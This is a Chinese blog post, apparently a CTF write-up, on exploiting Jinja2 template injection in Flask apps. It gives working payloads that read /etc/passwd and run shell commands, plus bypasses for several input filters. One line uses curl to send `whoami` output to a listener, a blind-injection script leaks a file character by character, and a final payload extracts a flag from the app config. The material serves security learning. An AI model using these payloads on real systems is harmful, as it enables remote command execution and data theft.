---
layout: post
title:  "flask框架ssti ctf利用小结"
subtitle: 'flask框架ssti ctf利用小结'
date:   2020-04-08 18:00:00
tags: SSTI CTF WEB安全 
description: 'SSTI CTF WEB安全'
color: 'RGB(205,85,85)'
---

#### 前言
闲着刷攻防世界题目的时候遇到一个题目，打开一看可以明显感觉到是服务器模板注入（SSTI），对漏洞原理倒是了解，但是payload构造却难住了，搜索相关资料后做一个记录，加固理解并分享。

#### 题目源码 

![image-20200603100040374.png](https://i.loli.net/2020/06/03/zCKdxMYfeaVuiQN.png)


#### 服务端模板注入
当web应用使用模板系统（如twig，jinja2等），在网页中插入动态内容。当输入内容被恶意控制时，就会产生该漏洞。

#### 在python如何利用ssti攻击
在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。

```
>>> print("".__class__)
>>> <class 'str'>
```
对于一个空字符串他已经打印了str类型，在python中，每个类都有一个bases属性，列出其基类。

```
>>> print("".__class__.__bases__)
(<type 'basestring'>,)
>>> print("".__class__.__base__.__base__)
<type 'object'>
>>> print("".__class__.__mro__)
(<type 'str'>, <type 'basestring'>, <type 'object'>)
```
这样就找到了他的基类object。也可以通过mro（解析方法调用的顺序）进行查找。
在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。

```
>>> print("".__class__.__mro__[2].__subclasses__())
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]
```
使用subclasses()方法（返回的是这个类的子类的集合），返回object类子类的集合
接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。
瞅了一圈没找到。
尝试初始化了一些变量，但是没找到想要的东西，可能是因为是python2.7的缘故或者windows环境问题

```
print(object.__subclasses__()[61].__init__.__globals__)
```
不过问题不大，这里的主要目的明白即可。
==通过基类找到可以执行命令或者文件操作的类，然后找具体函数调用即可。==

一些payload
```
# object.__subclasses__()[40]为file类
object.__subclasses__()[40]('/etc/passwd').read()
# object.__subclasses__()[59].__init__.func_globals.linecache下直接有os类
object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()

```

然后就需要在ctf中各种过滤

##### 过滤中括号

```
使用__getitim__绕过中括号限制
request.__class__.__mro__.__getitem__(8)
```

##### 过滤引号

![image-20200603100212175.png](https://i.loli.net/2020/06/03/rVdKZOpok5cPlSC.png)


##### 过滤双下划线

```
\{\{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() \}\}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

##### 过滤大括号

```
利用标记
\{\% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' \%\}1\{\% endif \%\}
相当于盲命令执行，利用curl将执行结果带出来
读取文件可以利用盲注的方法逐位将内容爆出来
\{\% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' \%\}~p0~\{\% endif \%\}
使用盲注脚本修改一下即可
# -*- coding: utf-8 -*-
import requests


url = 'http://127.0.0.1:8080/'

def check(payload):
    postdata = {
        'exploit':payload
        }
    r = requests.post(url, data=postdata).content
    return '~p0~' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '\{\% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" \%\}~p0~\{\% endif \%\}'
        if check(payload):
            password += c
            break
    print password
```

#### 题解
这个ctf题目过滤了括号，还加了黑名单[config , self ]  
这里就又涉及到另外一个知识  
flask 中内置的的变量函数  

##### flask 中内置的的变量函数  
```
config ：可以从模板中直接访问Flask当前的config对象：\{\{config.SQLALCHEMY_DATABASE_URL\}\}

request : 就是flask中代表当前请求的request对象 ， \{\{request.url\}\}

session :为Flask的session对象,\{\{session.new\}\} True

g变量：在视图函数中设置g变量的那么属性的值，然后再模板中直接可以取出\{\{g.name\}\}

url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，\{\{url_for('home')\}\} ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，\{\{url_for('post',post_id=1)\}\}

get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使用get_flashed_message()函数取出他们并消费掉


\{\%for message in get_flashed_messages()\%\}
\{\{message\}\}
\{\% endfor \%}
```

##### payload
最后构造出如下payload

```

\{\{get_flashed_messages.__globals__['current_app'].config['FLAG']\}\}

```


#### 各类ssti的一些模板渲染引擎及利用
![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png)
#### 参考链接
https://xz.aliyun.com/t/3679  
https://p0sec.net/index.php/archives/120/